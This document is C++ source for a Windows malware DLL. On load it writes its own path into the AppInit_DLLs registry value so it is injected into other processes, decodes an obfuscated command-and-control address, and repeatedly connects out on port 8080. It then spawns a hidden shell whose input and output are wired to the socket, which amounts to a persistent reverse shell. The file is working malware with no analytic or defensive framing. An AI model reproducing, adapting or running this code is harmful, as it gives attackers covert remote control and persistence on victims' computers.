#include "stdafx.h"
#include "obfuscate.h"

#define DEFAULT_BUFLEN 1024
#define MAXPATH 255
#define AUTORUN_KEY "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows"

void runShell(char* C2Server, int C2Port)
{
	while (1)
	{
		Sleep(5000);

		SOCKET mySocket;
		sockaddr_in addr;
		WSADATA version;
		WSAStartup(MAKEWORD(2, 2), &version);
		mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		addr.sin_family = AF_INET;

		addr.sin_addr.s_addr = inet_addr(C2Server);
		addr.sin_port = htons(C2Port);

		// connect to proxy/proxy IP/C2Host
		if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
		{
			closesocket(mySocket);
			WSACleanup();
			continue;
		}
		else
		{
			char RecvData[DEFAULT_BUFLEN];
			memset(RecvData, 0, sizeof(RecvData));
			int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
			if (RecvCode <= 0)
			{
				closesocket(mySocket);
				WSACleanup();
				continue;
			}
			else
			{
				char Process[8];
				strcpy(Process, obf::decode("\xcd\xe6\xcc\xb9\xe9\xd5\xe9").c_str());
				STARTUPINFOA sinfo;
				PROCESS_INFORMATION pinfo;

				memset(&sinfo, 0, sizeof(sinfo));
				sinfo.cb = sizeof(sinfo);
				sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;

				CreateProcessA(NULL, Process, NULL, NULL, TRUE, 0, NULL, "C:\\", &sinfo, &pinfo);
				WaitForSingleObject(pinfo.hProcess, INFINITE);

				CloseHandle(pinfo.hProcess);
				CloseHandle(pinfo.hThread);

				memset(RecvData, 0, sizeof(RecvData));
				int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
				if (RecvCode <= 0)
				{
					closesocket(mySocket);
					WSACleanup();
					continue;
				}
				if (strcmp(RecvData, "exit\n") == 0)
					exit(0);
			}
		}
	}
}

extern "C" _declspec(dllexport)
DWORD WINAPI reverseShell(LPVOID lpParam)
{
	char dllPath[MAXPATH];
	HMODULE hModule;

	GetModuleHandleExA(
		GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
		(LPCSTR) &reverseShell,
		&hModule
	);

	GetModuleFileNameA(hModule, dllPath, MAXPATH);

	HKEY hKey;

	RegOpenKeyExA(HKEY_LOCAL_MACHINE, AUTORUN_KEY, NULL, KEY_ALL_ACCESS, &hKey);
	RegSetValueExA((HKEY)hKey, "AppInit_DLLs", NULL, REG_SZ, (BYTE*)dllPath, strlen(dllPath));

	char host[15];
	strcpy(host, obf::decode("\x9f\xb2\x9a\xb9\xbd\x9b\xb4\x90\x8c\x98\xba\xaf\xa5\x95").c_str());
	int port = 8080;
	runShell(host, port);
	return 0;
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		CreateThread(NULL, NULL, reverseShell, NULL, NULL, NULL);
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
